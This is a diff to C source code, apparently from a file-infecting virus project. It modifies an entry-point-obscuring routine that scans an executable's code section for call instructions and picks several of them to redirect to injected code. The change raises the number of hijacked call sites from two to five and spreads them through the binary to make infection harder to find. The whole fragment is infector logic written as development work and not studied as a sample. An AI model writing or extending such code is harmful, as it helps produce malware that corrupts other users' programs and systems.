@@ -110,7 +110,7 @@ void		epo_parsing(t_info *info)
 {
 	size_t	i;
 	int32_t	nb_call_detected;
-	int32_t	to_infect[2];
+	int32_t	to_infect[5];
 	uint8_t	c;
 
 	i = 0;
@@ -122,23 +122,26 @@ void		epo_parsing(t_info *info)
 			nb_call_detected++;
 		i++;
 	}
-	if (nb_call_detected < 2)
+	if (nb_call_detected < 5)
 	{
 		info->valid_target = 0;
 		return ;
 	}
-	to_infect[0] = nb_call_detected / 4;
-	to_infect[1] = (nb_call_detected * 3) / 4 ;
+	to_infect[0] = 0;
+	to_infect[1] = nb_call_detected / 5;
+	to_infect[2] = (nb_call_detected * 2) / 5;
+	to_infect[3] = (nb_call_detected * 3) / 5;
+	to_infect[4] = (nb_call_detected * 4) / 5;
 
 	i = 0;
 	nb_call_detected = 0;
 	int32_t	nb = 0;
-	while (i < info->text_size && nb_call_detected <= to_infect[1])
+	while (i < info->text_size && nb_call_detected <= to_infect[4])
 	{
 		c = *((uint8_t *)(info->text_begin + i));
 		if (c == 0xe8 && i + 4 < info->text_size && (valid_call(info, i + 1) == 0))
 		{
-			if ((nb_call_detected == to_infect[0]) || (nb_call_detected == to_infect[1]))
+			if ((nb_call_detected == to_infect[0]) || (nb_call_detected == to_infect[1]) || (nb_call_detected == to_infect[2]) || (nb_call_detected == to_infect[3]) || (nb_call_detected == to_infect[4]))
 			{
 				nb++;
 				info->addr_call_to_replace = info->text_begin + i;
